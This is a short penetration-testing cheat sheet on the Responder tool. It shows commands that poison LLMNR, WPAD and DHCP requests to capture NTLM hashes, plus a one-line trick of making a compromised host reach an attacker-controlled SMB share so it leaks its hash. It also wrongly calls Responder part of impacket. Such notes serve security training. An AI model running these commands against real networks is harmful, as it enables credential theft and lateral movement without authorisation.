# Responder

Responder is a part of [impacket](https://github.com/fortra/impacket) toolkit and we will use it to respond to LLMNR requests 

## Usage


```bash
sudo Responder -I eth0 -dwv

-I # interface 
-w # Start the WPAD rogue proxy server
-d # Enable answers for DHCP broadcast requests.
-v # verbose, shows hash twice 

## Getting users hash after getting shell
```

```powershell
# you can get user ntlm hash after getting reverse shell on a target using responder and sending gci command 

sudo responder -I eth0 # on attacker
gci \\10.10.10.10\test\test # on target

```


---
Tags: #responder #smb_relay #mimt6 #MITM 
Resources:[Responder_github](https://github.com/SpiderLabs/Responder)